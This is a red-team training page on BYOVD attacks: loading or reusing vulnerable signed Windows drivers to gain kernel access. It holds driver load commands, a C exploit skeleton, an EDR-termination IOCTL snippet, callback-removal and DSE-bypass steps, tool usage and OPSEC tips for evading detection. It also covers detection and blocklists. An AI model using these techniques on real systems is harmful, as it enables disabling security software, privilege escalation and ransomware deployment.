---
layout: training-page
title: "BYOVD — Bring Your Own Vulnerable Driver — Red Team Academy"
module: "Evasion"
tags:
  - byovd
  - kernel
  - edr-evasion
  - drivers
  - windows
page_key: "evasion-byovd"
---

<h1>BYOVD — Bring Your Own Vulnerable Driver</h1>

<p>Bring Your Own Vulnerable Driver (BYOVD) is a technique where an attacker loads a legitimate, signed driver that contains known vulnerabilities. Because the driver is validly signed by Microsoft or a trusted vendor, it passes Driver Signature Enforcement (DSE). The attacker then exploits the driver's vulnerabilities from user-mode to gain kernel-level access — enabling EDR termination, callback removal, credential theft, and rootkit-level persistence.</p>

<p>BYOVD has become the dominant kernel-level evasion technique in real-world operations (2023-2026), used by APT groups including Lazarus, BlackCat/ALPHV, Cuba, and Scattered Spider. It is effective against all major EDR platforms.</p>

<h2>How BYOVD Works</h2>

<pre><code># Attack flow:
# 1. Drop a legitimate signed driver (.sys) to disk
# 2. Create and start a kernel service to load it
# 3. Exploit the driver's vulnerability via DeviceIoControl
# 4. Execute arbitrary kernel code (read/write kernel memory, etc.)
# 5. Use kernel access to disable EDR, remove callbacks, etc.

# Step 1-2: Load the driver
sc create VulnDriver type= kernel binPath= C:\Windows\Temp\vuln.sys
sc start VulnDriver

# Step 3-4: Exploit via IOCTL (conceptual — actual exploit is driver-specific)
# DeviceIoControl(hDevice, IOCTL_READ_PHYSICAL_MEMORY, &amp;input, sizeof(input), ...)
# DeviceIoControl(hDevice, IOCTL_WRITE_PHYSICAL_MEMORY, &amp;input, sizeof(input), ...)

# Step 5: Cleanup
sc stop VulnDriver
sc delete VulnDriver
del C:\Windows\Temp\vuln.sys</code></pre>

<h2>Pre-Installed OEM Vulnerable Drivers on Windows 11</h2>

<p>On OEM hardware, the weapon is often already loaded. These drivers ship with Dell, ASUS, Lenovo, GIGABYTE, and MSI machines — or are installed automatically by companion software (GIGABYTE App Center, ASUS Armoury Crate, Corsair iCUE, NZXT CAM). An attacker who already has user-land code execution can communicate with an already-loaded driver's device object via DeviceIoControl without dropping or installing anything — no service creation event, no driver load event.</p>

<table>
<tr><th>Driver</th><th>Vendor / Ships With</th><th>CVE</th><th>Capability</th></tr>
<tr><td><code>DBUtil_2_3.sys</code></td><td>Dell — firmware update utility (ships on Dell PCs)</td><td>CVE-2021-21551</td><td>Arbitrary physical memory R/W → SYSTEM token theft</td></tr>
<tr><td><code>RtCore64.sys</code></td><td>MSI Afterburner (GPU OC tool — common on gaming PCs)</td><td>CVE-2019-16098</td><td>Arbitrary physical memory R/W, MSR R/W, port I/O</td></tr>
<tr><td><code>gdrv.sys</code></td><td>GIGABYTE App Center, AORUS Engine, OC Guru II</td><td>CVE-2018-19320 to 19323</td><td>Physical mem R/W, MSR R/W, ring0 memcpy</td></tr>
<tr><td><code>LnvMSRIO.sys</code></td><td>Lenovo Process Management (ships on Lenovo laptops)</td><td>CVE-2025-8061</td><td>Physical mem R/W + MSR write, no DACL — any unprivileged user</td></tr>
<tr><td><code>LenovoDiagnosticsDriver.sys</code></td><td>Lenovo Diagnostics</td><td>CVE-2022-3699</td><td>Privilege escalation to SYSTEM</td></tr>
<tr><td><code>WinRing0.sys</code> / <code>WinRing0x64.sys</code></td><td>ASUS monitoring tools, Corsair iCUE, NZXT CAM, OpenHardwareMonitor</td><td>CVE-2020-14979</td><td>MSR R/W, port I/O, physical memory R/W</td></tr>
<tr><td><code>AsrDrv103.sys</code> / <code>AsrIbDrv.sys</code></td><td>ASRock hardware utilities (ASRock Polychrome, A-Tuning)</td><td>N/A</td><td>Kernel R/W</td></tr>
<tr><td><code>mhyprot2.sys</code></td><td>miHoYo Genshin Impact anti-cheat (user-installed)</td><td>N/A</td><td>ZwTerminateProcess from ring 0 — EDR kill</td></tr>
<tr><td><code>empntdrv.sys</code></td><td>EaseUS partition manager (common on consumer/managed PCs)</td><td>N/A</td><td>Kernel access</td></tr>
</table>

<p><strong>Attack path without dropping anything:</strong></p>

<pre><code># Step 1: Enumerate drivers already loaded on the target
sc query type= driver
driverquery /v /fo csv
# Or PowerShell:
Get-WmiObject Win32_SystemDriver | Select-Object Name, PathName, State | Format-Table

# Step 2: Check against the pre-installed driver list above
# If gdrv.sys is present AND GIGABYTE App Center is installed:
Get-WmiObject Win32_SystemDriver | Where-Object { $_.PathName -match "gdrv" }

# Step 3: If driver is loaded (Running state), open its device handle directly
# No sc create, no driver drop, no service install event (Windows Event ID 7045)
# The device object is already registered — just open and exploit IOCTLs
Get-ChildItem \\.\  # Enumerate accessible device objects</code></pre>

<p><strong>CVE-2025-8061 (Lenovo LnvMSRIO.sys) — critical detail:</strong> The device object <code>\\.\WinMsrDev</code> is created with <strong>no DACL</strong> — any process, including unprivileged ones, can open a handle. The driver exposes physical memory R/W and MSR R/W IOCTLs without any authentication check. A Quarkslab proof-of-concept demonstrates overwriting the <code>LSTAR</code> MSR (which holds the <code>KiSystemCall64()</code> address) to redirect all syscall dispatch to attacker shellcode, then using a ROP chain to disable SMEP/SMAP via CR4 modification. Sources: <a href="https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html">Quarkslab Part 1</a>, <a href="https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061_part2.html">Part 2 (rootkit)</a>.</p>

<h2>Common Vulnerable Drivers</h2>

<p>The LOLDrivers project catalogs vulnerable drivers. Key ones used in real attacks:</p>

<pre><code># Dell DBUtil (dbutil_2_3.sys) — CVE-2021-21551
# - Arbitrary physical memory read/write
# - Used by Lazarus Group, BlackByte
# - SHA256: 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5

# Gigabyte (gdrv.sys) — arbitrary MSR read/write
# - Used by RobbinHood ransomware
# - Allows arbitrary kernel memory read/write via MSR operations

# Intel Network Adapter Diagnostic Driver (iqvw64e.sys)
# - Arbitrary physical memory mapping
# - Used by multiple threat actors
# - Part of Intel Ethernet Diagnostics package

# Capcom.sys — direct kernel code execution
# - Contains a function that disables SMEP and calls user-supplied function pointer
# - Most straightforward BYOVD — gives you a kernel-mode function call

# Process Explorer driver (PROCEXP152.sys) — Zemana
# - Signed by Microsoft
# - Can kill arbitrary processes from kernel mode
# - Used by AuKill tool (BlackCat/ALPHV)

# RTCore64.sys (Micro-Star MSI) — CVE-2019-16098
# - Arbitrary physical memory read/write
# - Used by BlackByte ransomware

# WinRing0x64.sys — arbitrary MSR/port I/O
# - Common in hardware monitoring tools
# - Physical memory read/write capabilities

# HP OMEN Gaming Hub (HpPortIox64.sys) — CVE-2021-3437
# - Port-mapped I/O, arbitrary read/write</code></pre>

<h3>Notable 2024-2025 CVEs</h3>

<table>
<tr><th>CVE</th><th>Driver</th><th>Vendor</th><th>Impact</th></tr>
<tr><td>CVE-2025-8061</td><td>LnvMSRIO.sys</td><td>Lenovo Process Management</td><td>Physical mem R/W + MSR write, no DACL → Ring 0</td></tr>
<tr><td>CVE-2024-38193</td><td>AFD.sys (Windows built-in)</td><td>Microsoft — Ancillary Function Driver</td><td>Zero-day — Lazarus Group used to deploy FUDModule rootkit, disable CrowdStrike, Defender, AhnLab V3</td></tr>
<tr><td>CVE-2025-52915</td><td>K7RKScan.sys</td><td>K7 Computing AV</td><td>Process termination → EDR kill</td></tr>
<tr><td>CVE-2025-70795</td><td>STProcessMonitor.sys</td><td>Safetica</td><td>EDR kill</td></tr>
<tr><td>CVE-2024-51324</td><td>BdApiUtil64.sys</td><td>Baidu AntiVirus</td><td>EDR kill</td></tr>
<tr><td>CVE-2022-3699</td><td>LenovoDiagnosticsDriver.sys</td><td>Lenovo Diagnostics</td><td>Privilege escalation — still unpatched on many fleets</td></tr>
</table>

<p><strong>CVE-2024-38193 (AFD.sys) is particularly significant:</strong> AFD.sys is a <em>built-in Windows driver</em> — it is not a third-party component, it does not appear in the LOLDrivers database, and it cannot be blocked via the vulnerable driver blocklist. Lazarus Group (DPRK) exploited it as a zero-day to deploy the FUDModule rootkit — a kernel-level implant that directly disabled CrowdStrike Falcon, Windows Defender, AhnLab V3, and HitmanPro by manipulating kernel data structures. Patched August 2024 (KB5041585). Any unpatched Windows 11 system with AFD.sys is exploitable from user mode with standard user privileges.</p>

<h3>2025 Zero-Days</h3>

<pre><code># BioNTdrv.sys — Paragon Partition Manager (exploited as zero-day, 2025)
# CVE-2025-0289, CVE-2025-0290, CVE-2025-0291, CVE-2025-0292, CVE-2025-0293
# Five vulnerabilities in versions 1.3.0 and 1.5.1
# Exploited by ransomware gangs for privilege escalation to SYSTEM
# More severe than standard admin — bypasses even SYSTEM-level controls
# SHA256: fb0dbc3b9c897b7571b94fb2203ffb1ac0facfe366b2cb1f91904ea5335018f0
sc.exe create BioNTdrv type=kernel binPath=C:\windows\temp\BioNTdrv.sys
sc.exe start BioNTdrv</code></pre>

<h3>LOLDrivers Database</h3>

<pre><code># LOLDrivers project — comprehensive catalog of vulnerable drivers
# Website: loldrivers.io
# GitHub: github.com/magicsword-io/LOLDrivers
# See also: /evasion/loldrivers-reference/ — full database reference, API usage, detection

# Search for drivers by capability
# Categories:
#   - Physical memory read/write
#   - MSR read/write
#   - Process termination
#   - Arbitrary code execution
#   - Port I/O

# Download the driver database
curl -s https://www.loldrivers.io/api/drivers.json | \
  jq '.[] | select(.Category == "vulnerable") | .KnownVulnerableSamples[].SHA256'</code></pre>

<h2>Exploitation Techniques</h2>

<h3>EDR Killer via Process Termination</h3>

<pre><code>// Concept: Use a vulnerable driver to terminate EDR processes from kernel mode
// This bypasses Protected Process Light (PPL) and tamper protection

// 1. Find the EDR process PID
//    Common EDR processes:
//    - MsMpEng.exe (Defender)
//    - CylanceSvc.exe (Cylance)
//    - cb.exe (Carbon Black)
//    - CSFalconService.exe (CrowdStrike)
//    - SentinelAgent.exe (SentinelOne)
//    - bdservicehost.exe (Bitdefender)

// 2. Use the driver's kill-process IOCTL
// Example with Process Explorer driver:
typedef struct {
    DWORD pid;
    DWORD padding;
} KILL_PROCESS_INPUT;

KILL_PROCESS_INPUT input = { targetPid, 0 };
DeviceIoControl(hDevice,
    IOCTL_KILL_PROCESS,  // driver-specific IOCTL code
    &amp;input, sizeof(input),
    NULL, 0,
    &amp;bytesReturned, NULL);</code></pre>

<h3>Kernel Callback Removal</h3>

<pre><code>// EDRs register kernel callbacks to monitor:
//   - PsSetCreateProcessNotifyRoutineEx (process creation)
//   - PsSetCreateThreadNotifyRoutineEx (thread creation)
//   - PsSetLoadImageNotifyRoutineEx (image/DLL loads)
//   - ObRegisterCallbacks (object handle operations)
//   - CmRegisterCallbackEx (registry operations)

// Attack: Use physical memory read/write to find and zero-out callback arrays

// Step 1: Find nt!PspCreateProcessNotifyRoutine array
//   - Parse ntoskrnl.exe PDB or use pattern scanning
//   - Array contains pointers to registered callbacks

// Step 2: Read each callback entry
//   - Each entry is an EX_CALLBACK_ROUTINE_BLOCK
//   - Contains pointer to the callback function

// Step 3: Identify EDR callbacks by checking which module owns the function
//   - If function address is in CrowdStrike.sys range → EDR callback

// Step 4: Zero out or unregister the EDR's callbacks
//   - Write 0 to the callback array entry
//   - Or call PsSetCreateProcessNotifyRoutineEx with Remove=TRUE

// Tools that automate this:
// - EDRSandblast
// - CheekyBlinder
// - CallbackHell</code></pre>

<h3>DSE (Driver Signature Enforcement) Bypass</h3>

<pre><code>// Some vulnerable drivers allow you to disable DSE itself
// Then you can load your own unsigned kernel driver

// Approach 1: Patch ci.dll!g_CiOptions in memory
// g_CiOptions controls code integrity policy
// Set it to 0 to disable signature checks

// Step 1: Use vuln driver to read kernel memory and find ci.dll
// Step 2: Find g_CiOptions variable
// Step 3: Write 0 to g_CiOptions
// Step 4: Load unsigned driver with NtLoadDriver
// Step 5: Restore g_CiOptions to avoid detection

// Approach 2: Modify the driver object's DriverSection
// Mark your driver as signed by editing _KLDR_DATA_TABLE_ENTRY.Flags

// Approach 3: EFI bootkit (UEFI Secure Boot bypass)
// Modify boot configuration to disable DSE at boot time
// bcdedit.exe /set nointegritychecks on  (requires admin + reboot)</code></pre>

<h2>Practical BYOVD Tools</h2>

<h3>KDU (Kernel Driver Utility)</h3>

<pre><code># KDU — supports 40+ vulnerable drivers
# github.com/hfiref0x/KDU

# Map an unsigned driver using a vulnerable provider
kdu.exe -dse 0                    # Disable DSE
kdu.exe -map MyDriver.sys         # Map unsigned driver
kdu.exe -prv 1 -map MyDriver.sys  # Use specific provider (driver)

# List supported providers
kdu.exe -list

# Providers include:
#  0 - Intel Network Adapter (iqvw64e.sys)
#  1 - RTCore64.sys (MSI Afterburner)
#  2 - Gdrv.sys (Gigabyte)
#  3 - ATSZio64.sys (ASUSTeK)
#  6 - PROCEXP152.sys (Process Explorer)
# ... 40+ more</code></pre>

<h3>EDRSandblast</h3>

<pre><code># EDRSandblast — weaponized BYOVD for EDR bypass
# github.com/wavestone-cdt/EDRSandblast

# Requires RTCore64.sys or compatible driver
# Automated kernel callback removal + credential dumping

EDRSandblast.exe --usermode    # Unhook ntdll from user-mode
EDRSandblast.exe --kernelmode  # Remove kernel callbacks (requires vuln driver)
EDRSandblast.exe --dump-creds  # Dump credentials after disabling EDR

# What it does in kernel mode:
# 1. Removes PsSetCreateProcessNotifyRoutine callbacks
# 2. Removes PsSetCreateThreadNotifyRoutine callbacks
# 3. Removes PsSetLoadImageNotifyRoutine callbacks
# 4. Removes ObRegisterCallbacks entries
# 5. Removes CmRegisterCallback entries
# 6. Removes minifilter callbacks (file system monitoring)
# 7. Disables ETW TI (Threat Intelligence) provider</code></pre>

<h3>AuKill</h3>

<pre><code># AuKill — uses Process Explorer driver to terminate EDR
# Used by BlackCat/ALPHV ransomware affiliates

# Attack flow:
# 1. Drops PROCEXP152.sys (legitimate, Microsoft-signed)
# 2. Loads it as a service
# 3. Uses its process-kill IOCTL to terminate EDR services
# 4. Deploys ransomware payload

# Targeted EDR processes:
#   MsMpEng.exe, SentinelAgent.exe, CSFalconService.exe,
#   CylanceSvc.exe, bdservicehost.exe, and more</code></pre>

<h3>Terminator / SpyBoy</h3>

<pre><code># Terminator tool — uses zemana anti-malware driver
# Sold on dark web forums as "EDR/AV killer"
# Uses zamguard64.sys (Zemana Anti-Logger)

# Kills processes of 24+ EDR/AV products
# Requires admin access to load the driver
# Driver is legitimately signed — passes DSE</code></pre>

<h2>Writing a BYOVD Exploit</h2>

<pre><code>// Minimal BYOVD exploit structure (C/C++)
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define DEVICE_NAME "\\\\.\\VulnDriver"
#define IOCTL_READ_PHYS  0x80002048  // Driver-specific
#define IOCTL_WRITE_PHYS 0x8000204C  // Driver-specific

typedef struct {
    ULONGLONG PhysicalAddress;
    DWORD     Size;
    PVOID     Buffer;
} PHYS_MEM_REQUEST;

BOOL ReadPhysicalMemory(HANDLE hDevice, ULONGLONG addr, PVOID buf, DWORD size) {
    PHYS_MEM_REQUEST req = { addr, size, buf };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_READ_PHYS,
        &amp;req, sizeof(req), buf, size, &amp;bytesReturned, NULL);
}

BOOL WritePhysicalMemory(HANDLE hDevice, ULONGLONG addr, PVOID buf, DWORD size) {
    PHYS_MEM_REQUEST req = { addr, size, buf };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_WRITE_PHYS,
        &amp;req, sizeof(req), NULL, 0, &amp;bytesReturned, NULL);
}

int main() {
    // 1. Load vulnerable driver
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc = CreateService(scm, "VulnDriver", "VulnDriver",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, "C:\\Temp\\vuln.sys", NULL, NULL, NULL, NULL, NULL);
    StartService(svc, 0, NULL);

    // 2. Open device handle
    HANDLE hDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    // 3. Read/write kernel memory via physical memory access
    // ... exploit-specific logic here ...

    // 4. Cleanup
    CloseHandle(hDevice);
    // Stop and delete service
    SERVICE_STATUS ss;
    ControlService(svc, SERVICE_CONTROL_STOP, &amp;ss);
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    return 0;
}</code></pre>

<h2>Detection and OPSEC</h2>

<p>BYOVD leaves artifacts that defenders can detect:</p>

<pre><code># Detection signals:
# 1. Known vulnerable driver hashes on disk
#    - LOLDrivers provides YARA rules and hash lists
#    - Microsoft maintains a vulnerable driver blocklist

# 2. Service creation for kernel drivers
#    - Event ID 7045 (System log) — new service installed
#    - Sysmon Event ID 6 — driver loaded

# 3. DeviceIoControl calls to unusual device names
#    - ETW traces can log IOCTL codes

# 4. Kernel callback changes
#    - PPL-protected processes losing their callbacks
#    - Minifilter altitude changes

# OPSEC considerations:
# - Use less common drivers (avoid well-known ones like RTCore64.sys)
# - Load and unload quickly — minimize time the driver is present
# - Delete the driver from disk after loading
# - Rename the driver to something plausible
# - Use drivers not yet in the Microsoft blocklist
# - Consider timestomping the driver file</code></pre>

<h3>Microsoft Vulnerable Driver Blocklist</h3>

<pre><code># Microsoft maintains a blocklist in WDAC (Windows Defender Application Control)
# Updated via Windows Update
# Located at: C:\Windows\System32\CodeIntegrity\driversipolicy.p7b

# Check if blocklist is enabled:
Get-CimInstance -Namespace root\Microsoft\Windows\CI -ClassName MSFT_VSPolicy

# Bypass: The blocklist is NOT enabled by default on all Windows editions
# Only enforced when:
#   - HVCI (Hypervisor-enforced Code Integrity) is enabled
#   - Smart App Control is enabled
#   - Windows is in S mode

# Many enterprise systems do not have HVCI enabled
# Check HVCI status:
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard | 
  Select VirtualizationBasedSecurityStatus, HypervisorEnforcedCodeIntegrityStatus</code></pre>

<h2>EDR Killer Ecosystem (2024-2025)</h2>

<p>BYOVD moved from APT-exclusive to commodity ransomware in 2024. 54 distinct EDR killer tools now use BYOVD, collectively abusing 35 different signed drivers. Kaspersky measured a 23% quarter-on-quarter increase in BYOVD-targeted attacks in Q2 2024.</p>

<table>
<tr><th>Tool</th><th>Driver(s) Used</th><th>Who Uses It</th><th>Notes</th></tr>
<tr><td><strong>EDRKillShifter</strong></td><td>RentDrv2, ThreatFireMonitor</td><td>RansomHub, BlackSuit, Medusa, Qilin, DragonForce, Crytox, Lynx, INC Ransom (8 groups share builds)</td><td>Developed by RansomHub for their RaaS affiliates. Cross-group sharing operationally links RansomHub to Play, BianLian.</td></tr>
<tr><td><strong>Terminator / SpyBoy</strong></td><td><code>zamguard64.sys</code> (Zemana Anti-Logger)</td><td>Sold for $3,000 on dark forums</td><td>Kills 24+ EDR/AV/XDR products. Signed driver, no DSE trigger.</td></tr>
<tr><td><strong>AuKill</strong></td><td><code>PROCEXP152.sys</code> (Microsoft-signed Process Explorer)</td><td>BlackCat/ALPHV affiliates</td><td>Drops a legitimate Microsoft-signed binary to kill PPL-protected processes.</td></tr>
<tr><td><strong>Poortry</strong></td><td>WHQL-signed driver variants with stolen/leaked MS certs</td><td>BlackCat/ALPHV, Cl0p, Cuba, Hive</td><td>Fraudulently signed via Microsoft's signing portal.</td></tr>
<tr><td><strong>truesight.sys campaign</strong></td><td>RogueKiller Antirootkit v2.0.2 (~2,500 PE metadata variants)</td><td>Unknown — deployed HiddenGh0st RAT</td><td>Attackers generated 2,500 variants with identical signatures but different hashes to evade blocklist. Microsoft added v2.0.2 December 17, 2024. The version predates the July 29, 2015 blocklist cutoff, making it exempt from signature-based enforcement.</td></tr>
<tr><td><strong>KDMapper</strong></td><td><code>iqvw64e.sys</code> (Intel Network Adapter Diagnostic)</td><td>APTs, red teams</td><td>Loads unsigned kernel implants without disabling Secure Boot. Now on blocklist; forks active.</td></tr>
</table>

<pre><code># Detect EDRKillShifter deployment artifacts
# Looks for service creation events with kernel driver type shortly before EDR process exits

# Event ID 7045 — kernel service install (precedes kill)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | 
  Where-Object { $_.Properties[3].Value -eq '1' } |  # ServiceType = KernelDriver
  Select-Object TimeCreated, @{N='ServiceName';E={$_.Properties[0].Value}},
                @{N='Path';E={$_.Properties[1].Value}}

# EDR process exit events — cross-correlate with driver load timestamp
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4689} |
  Where-Object { $_.Properties[5].Value -match "MsMpEng|CSFalcon|SentinelAgent|cb\.exe" }</code></pre>

<h2>Windows 11 Defenses and Their Limits</h2>

<table>
<tr><th>Defense</th><th>Default State</th><th>Red Team Reality</th></tr>
<tr><td><strong>Microsoft Vulnerable Driver Blocklist</strong></td><td>On by default (Win 11 2022 Update+)</td><td>Updated quarterly — leaves months-long exploitation windows. 730 drivers in LOLDrivers are NOT yet on the blocklist.</td></tr>
<tr><td><strong>HVCI (Memory Integrity)</strong></td><td>On by default on new OEM devices with compatible hardware</td><td>465 drivers in LOLDrivers bypass HVCI. Not sufficient alone.</td></tr>
<tr><td><strong>WDAC (App Control)</strong></td><td>Requires explicit enterprise configuration</td><td>Strongest defense — explicit allowlisting. Rarely deployed due to operational complexity.</td></tr>
<tr><td><strong>ASR: Block abuse of vulnerable signed drivers</strong></td><td>Requires Defender for Endpoint Plan 2</td><td>Blocks writing a new driver to disk. Does NOT block already-installed OEM drivers from being opened and exploited.</td></tr>
<tr><td><strong>Smart App Control</strong></td><td>Consumer only — enabled on fresh installs</td><td>Enterprise systems typically disable or bypass SAC within days of deployment.</td></tr>
</table>

<p><strong>April 2026 — Microsoft removes cross-signed driver trust:</strong> Starting April 2026 (rolling out in evaluation mode first), Microsoft removes default OS trust for all kernel drivers signed through the deprecated cross-signed root CA program (deprecated 2021). Applies to Windows 11 24H2/25H2/26H1 and Server 2025. 81% of LOLDrivers samples are cross-signed — this structurally attacks the majority of the BYOVD inventory. However: evaluation mode means audit-only initially; enforcement timelines are per-system; the blocklist update lag problem is not addressed; and the 465 HVCI-bypass drivers remain a threat vector on older builds.</p>

<pre><code># Enumerate Windows 11 BYOVD attack surface on a target
# Run from an already-compromised user-mode session

# 1. Check HVCI status (if disabled, full BYOVD toolkit available)
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
    Select VirtualizationBasedSecurityStatus, HypervisorEnforcedCodeIntegrityStatus
# 2 = running, 0 = disabled

# 2. Check if blocklist enforcement is active
Get-CimInstance -Namespace root\Microsoft\Windows\CI -ClassName MSFT_VSPolicy 2>$null

# 3. Enumerate loaded kernel drivers and cross-reference against OEM list
Get-WmiObject Win32_SystemDriver | 
    Select-Object Name, PathName, State |
    Where-Object { $_.PathName -match "rtcore|gdrv|iqvw|dbutil|winring|lnvmsr|asrdrv|empnt|mhyprot" } |
    Format-Table -AutoSize

# 4. Check Windows Update patch level — unpatched AFD.sys (pre-Aug 2024) = immediate zero-day
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").UBR
# Cross-reference: AFD.sys CVE-2024-38193 patched in KB5041585 (Aug 13, 2024)</code></pre>

<h2>Resources</h2>

<ul>
  <li>LOLDrivers Project — <code>loldrivers.io</code></li>
  <li>KDU (Kernel Driver Utility) — <code>github.com/hfiref0x/KDU</code></li>
  <li>EDRSandblast — <code>github.com/wavestone-cdt/EDRSandblast</code></li>
  <li>BYOVDKit — <code>github.com/Hagrid29/BYOVDKit</code></li>
  <li>BlackSnufkin/BYOVD research (CVE-2025-52915, CVE-2025-1055) — <code>github.com/BlackSnufkin/BYOVD</code></li>
  <li>Microsoft Recommended Driver Block Rules — <code>learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules</code></li>
  <li>CheekyBlinder — kernel callback removal — <code>github.com/br-sn/CheekyBlinder</code></li>
  <li>Quarkslab — CVE-2025-8061 Lenovo Driver Exploitation Part 1 — <code>blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html</code></li>
  <li>Quarkslab — CVE-2025-8061 Part 2 (rootkit) — <code>blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061_part2.html</code></li>
  <li>Talos — Exploring Vulnerable Windows Drivers — <code>blog.talosintelligence.com/exploring-vulnerable-windows-drivers/</code></li>
  <li>The Hacker News — 2,500 truesight.sys Variants (2025) — <code>thehackernews.com/2025/02/2500-truesightsys-driver-variants.html</code></li>
  <li>Check Point Research — Breaking Boundaries: Investigating Vulnerable Drivers (2024) — <code>research.checkpoint.com/2024/breaking-boundaries-investigating-vulnerable-drivers-and-mitigating-risks/</code></li>
  <li>Help Net Security — RansomHub EDRKillShifter shared across 8 groups (2025) — <code>helpnetsecurity.com/2025/03/26/ransomhub-edrkillshifter-tool/</code></li>
</ul>
